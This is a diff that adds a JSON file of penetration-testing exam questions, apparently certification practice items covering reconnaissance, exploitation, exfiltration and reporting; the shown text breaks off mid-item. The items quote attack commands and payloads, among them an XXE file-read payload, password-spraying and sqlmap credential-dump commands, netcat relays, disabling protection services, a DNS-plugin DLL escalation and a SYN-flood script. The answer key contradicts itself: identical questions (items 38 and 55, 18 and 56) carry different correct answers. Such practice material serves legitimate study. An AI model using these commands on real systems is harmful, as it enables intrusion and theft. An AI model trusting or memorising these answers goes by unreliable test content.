@@ -1,0 +1,3384 @@
+[
+  {
+    "id": 1,
+    "question": "In a file stored in an unprotected source code repository, a penetration tester discovers the following line of code: sshpass -p donotchange ssh admin@192.168.6.14 Which of the following should the tester attempt to do next to take advantage of this information? (Select two).",
+    "options": {
+      "A": "Use Nmap to identify all the SSH systems active on the network.",
+      "B": "Take a screen capture of the source code repository for documentation purposes.",
+      "C": "Investigate to find whether other files containing embedded passwords are in the code repository.",
+      "D": "Confirm whether the server 192.168.6.14 is up by sending ICMP probes.",
+      "E": "Run a password-spraying attack with Hydra against all the SSH servers.",
+      "F": "Use an external exploit through Metasploit to compromise host 192.168.6.14."
+    },
+    "correct": [
+      "B",
+      "C"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 2,
+    "question": "Which of the following protocols would a penetration tester most likely utilize to exfiltrate data covertly and evade detection?",
+    "options": {
+      "A": "FTP",
+      "B": "HTTPS",
+      "C": "SMTP",
+      "D": "DNS"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 4,
+    "question": "A penetration tester successfully gained access to manage resources and services within the company's cloud environment. This was achieved by exploiting poorly secured administrative credentials that had extensive permissions across the network. Which of the following credentials was the tester able to obtain?",
+    "options": {
+      "A": "IAM credentials",
+      "B": "SSH key for cloud instance",
+      "C": "Cloud storage credentials",
+      "D": "Temporary security credentials (STS)"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 5,
+    "question": "Which of the following can an access control vestibule help deter?",
+    "options": {
+      "A": "USB drops",
+      "B": "Badge cloning",
+      "C": "Lock picking",
+      "D": "Tailgating"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 6,
+    "question": "During a red-team exercise, a penetration tester obtains an employee's access badge. The tester uses the badge's information to create a duplicate for unauthorized entry. Which of the following best describes this action?",
+    "options": {
+      "A": "Smurfing",
+      "B": "Credential stuffing",
+      "C": "RFID cloning",
+      "D": "Card skimming"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 7,
+    "question": "During a security assessment, a penetration tester needs to exploit a vulnerability in a wireless network's authentication mechanism to gain unauthorized access to the network. Which of the following attacks would the tester most likely perform to gain access?",
+    "options": {
+      "A": "KARMA attack",
+      "B": "Beacon flooding",
+      "C": "MAC address spoofing",
+      "D": "Eavesdropping"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 8,
+    "question": "A penetration tester has discovered sensitive files on a system. Assuming exfiltration of the files is part of the scope of the test, which of the following is most likely to evade DLP systems?",
+    "options": {
+      "A": "Encoding the data and pushing through DNS to the tester's controlled server.",
+      "B": "Padding the data and uploading the files through an external cloud storage service.",
+      "C": "Obfuscating the data and pushing through FTP to the tester's controlled server.",
+      "D": "Hashing the data and emailing the files to the tester's company inbox."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 9,
+    "question": "Which of the following techniques is the best way to avoid detection by data loss prevention tools?",
+    "options": {
+      "A": "Encoding",
+      "B": "Compression",
+      "C": "Encryption",
+      "D": "Obfuscation"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 10,
+    "question": "A tester gains initial access to a server and needs to enumerate all corporate domain DNS records. Which of the following commands should the tester use?",
+    "options": {
+      "A": "dig +short A AAAA local.domain",
+      "B": "nslookup local.domain",
+      "C": "dig axfr @local.dns.server",
+      "D": "nslookup -server local.dns.server local.domain *"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 11,
+    "question": "A penetration tester wants to send a specific network packet with custom flags and sequence numbers to a vulnerable target. Which of the following should the tester use?",
+    "options": {
+      "A": "tcprelay",
+      "B": "Bluecrack",
+      "C": "Scapy",
+      "D": "tcpdump"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 12,
+    "question": "During a security assessment, a penetration tester wants to compromise user accounts without triggering IDS /IPS detection rules. Which of the following is the most effective way for the tester to accomplish this task?",
+    "options": {
+      "A": "Crack user accounts using compromised hashes.",
+      "B": "Brute force accounts using a dictionary attack.",
+      "C": "Bypass authentication using SQL injection.",
+      "D": "Compromise user accounts using an XSS attack."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 13,
+    "question": "A penetration tester gains access to the target network and observes a running SSH server. Which of the following techniques should the tester use to obtain the version of SSH running on the target server?",
+    "options": {
+      "A": "Network sniffing",
+      "B": "IP scanning",
+      "C": "Banner grabbing",
+      "D": "DNS enumeration"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 14,
+    "question": "A penetration tester plans to conduct reconnaissance during an engagement using readily available resources. Which of the following resources would most likely identify hardware and software being utilized by the client?",
+    "options": {
+      "A": "Cryptographic flaws",
+      "B": "Protocol scanning",
+      "C": "Cached pages",
+      "D": "Job boards"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 15,
+    "question": "A penetration tester enters an invalid user ID on the login page of a web application. The tester receives a message indicating the user is not found. Then, the tester tries a valid user ID but an incorrect password, but the web application indicates the password is invalid. Which of the following should the tester attempt next?",
+    "options": {
+      "A": "Error log analysis",
+      "B": "DoS attack",
+      "C": "Enumeration",
+      "D": "Password dictionary attack"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 16,
+    "question": "Which of the following components should a penetration tester include in an assessment report?",
+    "options": {
+      "A": "User activities",
+      "B": "Customer remediation plan",
+      "C": "Key management",
+      "D": "Attack narrative"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 17,
+    "question": "A penetration tester is preparing a password-spraying attack against a known list of users for the company \"example\". The tester is using the following list of commands: pw-inspector -i sailwords -t 8 -S pass spray365.py spray -ep plan users=\"~/user.txt\"; allwords=\"~/words.txt\"; pass=\"~/passwords.txt\"; plan=\"~/spray.plan\" spray365.py generate --password-file $pass --userfile $user --domain \"example.com\" --execution-plan $plan cew -m 5 \"http://www.example.com\" -w sailwords Which of the following is the correct order for the list of the commands?",
+    "options": {
+      "A": "3, 4, 1, 2, 5",
+      "B": "3, 1, 2, 5, 4",
+      "C": "2, 3, 1, 4, 5",
+      "D": "3, 5, 1, 4, 2"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 18,
+    "question": "A client recently hired a penetration testing firm to conduct an assessment of their consumer-facing web application. Several days into the assessment, the client’s networking team observes a substantial increase in DNS traffic. Which of the following would most likely explain the increase in DNS traffic?",
+    "options": {
+      "A": "Covert data exfiltration",
+      "B": "URL spidering",
+      "C": "HTML scraping",
+      "D": "DoS attack"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 19,
+    "question": "A penetration tester reviews a SAST vulnerability scan report. The following vulnerability has been reported as high severity: Source file: components.ts Issue 2 of 12: Command injection Severity: High Call: .innerHTML = response The tester inspects the source file and finds the variable response is defined as a constant and is not referred to or used in other sections of the code. Which of the following describes how the tester should classify this reported vulnerability?",
+    "options": {
+      "A": "False negative",
+      "B": "False positive",
+      "C": "True positive",
+      "D": "Low severity"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 20,
+    "question": "During a penetration test, the tester uses a vulnerability scanner to collect information about any possible vulnerabilities that could be used to compromise the network. The tester receives the results and then executes the following command: snmpwalk -v 2c -c public 192.168.1.23 Which of the following is the tester trying to do based on the command they used?",
+    "options": {
+      "A": "Bypass defensive systems to collect more information.",
+      "B": "Use an automation tool to perform the attacks.",
+      "C": "Script exploits to gain access to the systems and host.",
+      "D": "Validate the results and remove false positives."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 21,
+    "question": "A penetration tester finished a security scan and uncovered numerous vulnerabilities on several hosts. Based on the targets' EPSS and CVSS scores, which of the following targets is the most likely to get attacked?",
+    "options": {
+      "A": "Target 1: EPSS Score = 0.6 and CVSS Score = 4",
+      "B": "Target 2: EPSS Score = 0.3 and CVSS Score = 2",
+      "C": "Target 3: EPSS Score = 0.6 and CVSS Score = 1",
+      "D": "Target 4: EPSS Score = 0.4 and CVSS Score = 4.5"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 22,
+    "question": "A penetration tester gains shell access to a Windows host. The tester needs to permanently turn off protections in order to install additional payload. Which of the following commands is most appropriate?",
+    "options": {
+      "A": "sc config <svc_name> start=disabled",
+      "B": "sc query state= all",
+      "C": "pskill <pid_svc_name>",
+      "D": "net config <svc_name>"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 23,
+    "question": "Which of the following elements of a penetration test report can be used to most effectively prioritize the remediation efforts for all the findings?",
+    "options": {
+      "A": "Methodology",
+      "B": "Detailed findings list",
+      "C": "Risk score",
+      "D": "Executive summary"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 24,
+    "question": "A penetration tester is testing a power plant's network and needs to avoid disruption to the grid. Which of the following methods is most appropriate to identify vulnerabilities in the network?",
+    "options": {
+      "A": "Configure a network scanner engine and execute the scan.",
+      "B": "Execute a testing framework to validate vulnerabilities on the devices.",
+      "C": "Configure a port mirror and review the network traffic.",
+      "D": "Run a network mapper tool to get an understanding of the devices."
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 25,
+    "question": "During a security assessment for an internal corporate network, a penetration tester wants to gain unauthorized access to internal resources by executing an attack that uses software to disguise itself as legitimate software. Which of the following host-based attacks should the tester use?",
+    "options": {
+      "A": "On-path",
+      "B": "Logic bomb",
+      "C": "Rootkit",
+      "D": "Buffer overflow"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 26,
+    "question": "A penetration testing team needs to determine whether it is possible to disrupt the wireless communications for PCs deployed in the client's offices. Which of the following techniques should the penetration tester leverage?",
+    "options": {
+      "A": "Port mirroring",
+      "B": "Sidecar scanning",
+      "C": "ARP poisoning",
+      "D": "Channel scanning"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 27,
+    "question": "A penetration testing team needs to determine whether it is possible to disrupt wireless communications for PCs deployed in the client’s offices. Which of the following techniques should the penetration tester leverage?",
+    "options": {
+      "A": "Port mirroring",
+      "B": "Sidecar scanning",
+      "C": "ARP poisoning",
+      "D": "Channel scanning"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 28,
+    "question": "A client warns the assessment team that an ICS application is maintained by the manufacturer. Any tampering of the host could void the enterprise support terms of use. Which of the following techniques would be most effective to validate whether the application encrypts communications in transit?",
+    "options": {
+      "A": "Utilizing port mirroring on a firewall appliance",
+      "B": "Installing packet capture software on the server",
+      "C": "Reconfiguring the application to use a proxy",
+      "D": "Requesting that certificate pinning be disabled"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 29,
+    "question": "Which of the following components should a penetration tester include in the final assessment report?",
+    "options": {
+      "A": "User activities",
+      "B": "Customer remediation plan",
+      "C": "Key management",
+      "D": "Attack narrative"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 30,
+    "question": "After a recent penetration test was conducted by the company's penetration testing team, a systems administrator notices the following in the logs: 2/10/2023 05:50AM C:\\users\\mgranite\\schtasks /query 2/10/2023 05:53AM C:\\users\\mgranite\\schtasks /CREATE /SC DAILY Which of the following best explains the team's objective?",
+    "options": {
+      "A": "To enumerate current users",
+      "B": "To determine the users' permissions",
+      "C": "To view scheduled processes",
+      "D": "To create persistence in the network"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 31,
+    "question": "A penetration tester enumerates a legacy Windows host on the same subnet. The tester needs to select exploit methods that will have the least impact on the host's operating stability. Which of the following commands should the tester try first?",
+    "options": {
+      "A": "responder -I eth0 john responder_output.txt <rdp to target>",
+      "B": "hydra -L administrator -P /path/to/pwlist.txt -t 100 rdp://<target_host>",
+      "C": "msf > use <module_name> msf > set <options> msf > set PAYLOAD windows/meterpreter",
+      "D": "python3 ./buffer_overflow_with_shellcode.py <target> 445"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 32,
+    "question": "During an engagement, a penetration tester needs to break the key for the Wi-Fi network that uses WPA2 encryption. Which of the following attacks would accomplish this objective?",
+    "options": {
+      "A": "ChopChop",
+      "B": "Replay",
+      "C": "Initialization vector",
+      "D": "KRACK"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 33,
+    "question": "A penetration tester conducts reconnaissance for a client's network and identifies the following system of interest: $ nmap -A AppServer1.compita.org Starting Nmap 7.80 (2023-01-14) on localhost (127.0.0.1) at 2023-08-04 15:32:27 Nmap scan report for AppServer1.compita.org (192.168.1.100) Host is up (0.001s latency). Not shown: 999 closed ports Port State Service 21/tcp open ftp 22/tcp open ssh 23/tcp open telnet 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 873/tcp open rsync 8080/tcp open http-proxy 8443/tcp open https-alt 9090/tcp open zeus-admin 10000/tcp open snet-sensor-mgmt The tester notices numerous open ports on the system of interest. Which of the following best describes this system?",
+    "options": {
+      "A": "A honeypot",
+      "B": "A Windows endpoint",
+      "C": "A Linux server",
+      "D": "An already-compromised system"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 34,
+    "question": "A penetration tester gains access to a Windows machine and wants to further enumerate users with native operating system credentials. Which of the following should the tester use?",
+    "options": {
+      "A": "route",
+      "B": "nbtstat",
+      "C": "net",
+      "D": "whoami"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 35,
+    "question": "During a penetration testing engagement, a tester targets the internet-facing services used by the client. Which of the following describes the type of assessment that should be considered in this scope of work?",
+    "options": {
+      "A": "Segmentation",
+      "B": "Mobile",
+      "C": "External",
+      "D": "Web"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 36,
+    "question": "A penetration tester needs to exploit a vulnerability in a wireless network that has weak encryption to perform traffic analysis and decrypt sensitive information. Which of the following techniques would best allow the penetration tester to have access to the sensitive information?",
+    "options": {
+      "A": "Bluejacking",
+      "B": "SSID spoofing",
+      "C": "Packet sniffing",
+      "D": "ARP poisoning"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 37,
+    "question": "A penetration tester cannot find information on the target company's systems using common OSINT methods. The tester's attempts to do reconnaissance against internet-facing resources have been blocked by the company's WAF. Which of the following is the best way to avoid the WAF and gather information about the target company's systems?",
+    "options": {
+      "A": "HTML scraping",
+      "B": "Code repository scanning",
+      "C": "Directory enumeration",
+      "D": "Port scanning"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 38,
+    "question": "A penetration tester is researching a path to escalate privileges. While enumerating current user privileges, the tester observes the following output: mathematica Copy code SeAssignPrimaryTokenPrivilege Disabled SeIncreaseQuotaPrivilege Disabled SeChangeNotifyPrivilege Enabled SeManageVolumePrivilege Enabled SeImpersonatePrivilege Enabled SeCreateGlobalPrivilege Enabled SeIncreaseWorkingSetPrivilege Disabled Which of the following privileges should the tester use to achieve the goal?",
+    "options": {
+      "A": "SeImpersonatePrivilege",
+      "B": "SeCreateGlobalPrivilege",
+      "C": "SeChangeNotifyPrivilege",
+      "D": "SeManageVolumePrivilege"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 39,
+    "question": "A penetration tester is conducting reconnaissance for an upcoming assessment of a large corporate client. The client authorized spear phishing in the rules of engagement. Which of the following should the tester do first when developing the phishing campaign?",
+    "options": {
+      "A": "Shoulder surfing",
+      "B": "Recon-ng",
+      "C": "Social media",
+      "D": "Password dumps"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 40,
+    "question": "During an assessment, a penetration tester runs the following command: dnscmd.exe /config /serverlevelplugindll C:\\users\\necad-TA\\Documents\\adduser.dll Which of the following is the penetration tester trying to achieve?",
+    "options": {
+      "A": "DNS enumeration",
+      "B": "Privilege escalation",
+      "C": "Command injection",
+      "D": "A list of available users"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 41,
+    "question": "A penetration tester finds that an application responds with the contents of the /etc/passwd file when the following payload is sent: <?xml version=\"1.0\"?> <!DOCTYPE data [ <!ENTITY foo SYSTEM \"file:///etc/passwd\"> ]> <test>&foo;</test> Which of the following should the tester recommend in the report to best prevent this type of vulnerability?",
+    "options": {
+      "A": "Drop all excessive file permissions with chmod o-rwx",
+      "B": "Ensure the requests application access logs are reviewed frequently",
+      "C": "Disable the use of external entities",
+      "D": "Implement a WAF to filter all incoming requests"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 42,
+    "question": "A penetration tester is performing an assessment focused on attacking the authentication identity provider hosted within a cloud provider. During the reconnaissance phase, the tester finds that the system is using OpenID Connect with OAuth and has dynamic registration enabled. Which of the following attacks should the tester try first?",
+    "options": {
+      "A": "A password-spraying attack against the authentication system",
+      "B": "A brute-force attack against the authentication system",
+      "C": "A replay attack against the authentication flow in the system",
+      "D": "A mask attack against the authentication system"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 44,
+    "question": "A penetration tester performs a service enumeration process and receives the following result after scanning a server using the Nmap tool: PORT STATE SERVICE 22/tcp open ssh 25/tcp filtered smtp 111/tcp open rpcbind 2049/tcp open nfs Based on the output, which of the following services provides the best target for launching an attack?",
+    "options": {
+      "A": "Database",
+      "B": "Remote access",
+      "C": "Email",
+      "D": "File sharing"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 45,
+    "question": "A penetration tester established an initial compromise on a host. The tester wants to pivot to other targets and set up an appropriate relay. The tester needs to enumerate through the compromised host as a relay from the tester's machine. Which of the following commands should the tester use to do this task from the tester's host?",
+    "options": {
+      "A": "attacker_host$ nmap -sT <target_cidr> | nc -n <compromised_host> 22",
+      "B": "attacker_host$ mknod backpipe p attacker_host$ nc -l -p 8000 | 0<backpipe | nc <target_cidr> 80 | tee",
+      "C": "attacker_host$ nc -nlp 8000 | nc -n <target_cidr> attacker_host$ nmap -sT 127.0.0.1 8000",
+      "D": "attacker_host$ proxychains nmap -sT <target_cidr>"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 46,
+    "question": "A penetration tester identifies the URL for an internal administration application while following DevOps team members on their commutes. Which of the following attacks did the penetration tester most likely use?",
+    "options": {
+      "A": "Shoulder surfing",
+      "B": "Dumpster diving",
+      "C": "Spear phishing",
+      "D": "Tailgating"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 47,
+    "question": "A penetration tester wants to use the following Bash script to identify active servers on a network: 1 network_addr=\"192.168.1\" 2 for h in {1..254}; do 3 ping -c 1 -W 1 $network_addr.$h > /dev/null 4 if [ $? -eq 0 ]; then 5 echo \"Host $h is up\" 6 else 7 echo \"Host $h is down\" 8 fi 9 done Which of the following should the tester do to modify the script?",
+    "options": {
+      "A": "Change the condition on line 4.",
+      "B": "Add 2>&1 at the end of line 3.",
+      "C": "Use seq on the loop on line 2.",
+      "D": "Replace $h with ${h} on line 3."
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 48,
+    "question": "A penetration tester runs a vulnerability scan that identifies several issues across numerous customer hosts. The executive report outlines the following: The client is concerned about the availability of its consumer-facing production application. Which of the following hosts should the penetration tester select for additional manual testing?",
+    "options": {
+      "A": "Server 1",
+      "B": "Server 2",
+      "C": "Server 3",
+      "D": "Server 4"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 49,
+    "question": "A penetration tester is performing a network security assessment. The tester wants to intercept communication between two users and then view and potentially modify transmitted data. Which of the following types of on- path attacks would be best to allow the penetration tester to achieve this result?",
+    "options": {
+      "A": "DNS spoofing",
+      "B": "ARP poisoning",
+      "C": "VLAN hopping",
+      "D": "SYN flooding"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 50,
+    "question": "A penetration tester assesses a complex web application and wants to explore potential security weaknesses by searching for subdomains that might have existed in the past. Which of the following tools should the penetration tester use?",
+    "options": {
+      "A": "Censys.io",
+      "B": "Shodan",
+      "C": "Wayback Machine",
+      "D": "SpiderFoot"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 51,
+    "question": "During an engagement, a penetration tester found some weaknesses that were common across the customer’s entire environment. The weaknesses included the following: Weaker password settings than the company standard Systems without the company's endpoint security software installed Operating systems that were not updated by the patch management system Which of the following recommendations should the penetration tester provide to address the root issue?",
+    "options": {
+      "A": "Add all systems to the vulnerability management system.",
+      "B": "Implement a configuration management system.",
+      "C": "Deploy an endpoint detection and response system.",
+      "D": "Patch the out-of-date operating systems."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 52,
+    "question": "While performing an internal assessment, a tester uses the following command: crackmapexec smb 192.168.1.0/24 -u user.txt -p Summer123@ Which of the following is the main purpose of the command?",
+    "options": {
+      "A": "To perform a pass-the-hash attack over multiple endpoints within the internal network",
+      "B": "To perform common protocol scanning within the internal network",
+      "C": "To perform password spraying on internal systems",
+      "D": "To execute a command in multiple endpoints at the same time"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 53,
+    "question": "A penetration tester needs to obtain sensitive data from several executives who regularly work while commuting by train. Which of the following methods should the tester use for this task?",
+    "options": {
+      "A": "Shoulder surfing",
+      "B": "Credential harvesting",
+      "C": "Bluetooth spamming",
+      "D": "MFA fatigue"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 54,
+    "question": "A penetration tester is attempting to exfiltrate sensitive data from a client environment without alerting the client's blue team. Which of the following exfiltration methods most likely remain undetected?",
+    "options": {
+      "A": "Cloud storage",
+      "B": "Email",
+      "C": "Domain Name System",
+      "D": "Test storage sites"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 55,
+    "question": "A penetration tester is researching a path to escalate privileges. While enumerating current user privileges, the tester observes the following: SeAssignPrimaryTokenPrivilege Disabled SeIncreaseQuotaPrivilege Disabled SeChangeNotifyPrivilege Enabled SeManageVolumePrivilege Enabled SeImpersonatePrivilege Enabled SeCreateGlobalPrivilege Enabled SeIncreaseWorkingSetPrivilege Disabled Which of the following privileges should the tester use to achieve the goal?",
+    "options": {
+      "A": "SeImpersonatePrivilege",
+      "B": "SeCreateGlobalPrivilege",
+      "C": "SeChangeNotifyPrivilege",
+      "D": "SeManageVolumePrivilege"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 56,
+    "question": "A client recently hired a penetration testing firm to conduct an assessment of their consumer-facing web application. Several days into the assessment, the client's networking team observes a substantial increase in DNS traffic. Which of the following would most likely explain the increase in DNS traffic?",
+    "options": {
+      "A": "Covert data exfiltration",
+      "B": "URL spidering",
+      "C": "HTML scrapping",
+      "D": "DoS attack"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 57,
+    "question": "A penetration tester completed OSINT work and needs to identify all subdomains for mydomain.com. Which of the following is the best command for the tester to use?",
+    "options": {
+      "A": "nslookup mydomain.com » /path/to/results.txt",
+      "B": "crunch 1 2 | xargs -n 1 -I 'X' nslookup X.mydomain.com",
+      "C": "dig @8.8.8.8 mydomain.com ANY » /path/to/results.txt",
+      "D": "cat wordlist.txt | xargs -n 1 -I 'X' dig X.mydomain.com"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 58,
+    "question": "A penetration tester is authorized to perform a DoS attack against a host on a network. Given the following input: ip = IP(\"192.168.50.2\") tcp = TCP(sport=RandShort(), dport=80, flags=\"S\") raw = RAW(b\"X\"*1024) p = ip/tcp/raw send(p, loop=1, verbose=0) Which of the following attack types is most likely being used in the test?",
+    "options": {
+      "A": "MDK4",
+      "B": "Smurf attack",
+      "C": "FragAttack",
+      "D": "SYN flood"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 59,
+    "question": "During a pre-engagement activity with a new customer, a penetration tester looks for assets to test. Which of the following is an example of a target that can be used for testing?",
+    "options": {
+      "A": "API",
+      "B": "HTTP",
+      "C": "IPA",
+      "D": "ICMP"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 60,
+    "question": "A penetration tester writes the following script to enumerate a 1724 network: 1 #!/bin/bash 2 for i in {1..254}; do 3 ping -c1 192.168.1.$i 4 done The tester executes the script, but it fails with the following error: -bash: syntax error near unexpected token `ping' Which of the following should the tester do to fix the error?",
+    "options": {
+      "A": "Add do after line 2.",
+      "B": "Replace {1..254} with $(seq 1 254).",
+      "C": "Replace bash with tsh.",
+      "D": "Replace $i with ${i}."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 61,
+    "question": "A penetration tester needs to launch an Nmap scan to find the state of the port for both TCP and UDP services. Which of the following commands should the tester use?",
+    "options": {
+      "A": "nmap -sU -sW -p 1-65535 example.com",
+      "B": "nmap -sU -sY -p 1-65535 example.com",
+      "C": "nmap -sU -sT -p 1-65535 example.com",
+      "D": "nmap -sU -sN -p 1-65535 example.com"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 62,
+    "question": "A penetration tester needs to test a very large number of URLs for public access. Given the following code snippet: 1 import requests 2 import pathlib 3 4 for url in pathlib.Path(\"urls.txt\").read_text().split(\"\\n\"): 5 response = requests.get(url) 6 if response.status == 401: 7 print(\"URL accessible\") Which of the following changes is required?",
+    "options": {
+      "A": "The condition on line 6",
+      "B": "The method on line 5",
+      "C": "The import on line 1",
+      "D": "The delimiter in line 3"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 63,
+    "question": "A penetration tester launches an attack against company employees. The tester clones the company's intranet login page and sends the link via email to all employees. Which of the following best describes the objective and tool selected by the tester to perform this activity?",
+    "options": {
+      "A": "Gaining remote access using BeEF",
+      "B": "Obtaining the list of email addresses using theHarvester",
+      "C": "Harvesting credentials using SET",
+      "D": "Launching a phishing campaign using GoPhish"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 65,
+    "question": "A consultant starts a network penetration test. The consultant uses a laptop that is hardwired to the network to try to assess the network with the appropriate tools. Which of the following should the consultant engage first?",
+    "options": {
+      "A": "Service discovery",
+      "B": "OS fingerprinting",
+      "C": "Host discovery",
+      "D": "DNS enumeration"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 66,
+    "question": "A penetration tester is compiling the final report for a recently completed engagement. A junior QA team member wants to know where they can find details on the impact, overall security findings, and high-level statements. Which of the following sections of the report would most likely contain this information?",
+    "options": {
+      "A": "Quality control",
+      "B": "Methodology",
+      "C": "Executive summary",
+      "D": "Risk scoring"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 67,
+    "question": "During an assessment, a penetration tester exploits an SQLi vulnerability. Which of the following commands would allow the penetration tester to enumerate password hashes?",
+    "options": {
+      "A": "sqlmap -u www.example.com/?id=1 --search -T user",
+      "B": "sqlmap -u www.example.com/?id=1 --dump -D accounts -T users -C cred",
+      "C": "sqlmap -u www.example.com/?id=1 --tables -D accounts",
+      "D": "sqlmap -u www.example.com/?id=1 --schema --current-user --current-db"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 68,
+    "question": "During an external penetration test, a tester receives the following output from a tool: test.comptia.org info.comptia.org vpn.comptia.org exam.comptia.org Which of the following commands did the tester most likely run to get these results?",
+    "options": {
+      "A": "nslookup -type=SOA comptia.org",
+      "B": "amass enum -passive -d comptia.org",
+      "C": "nmap -Pn -sV -vv -A comptia.org",
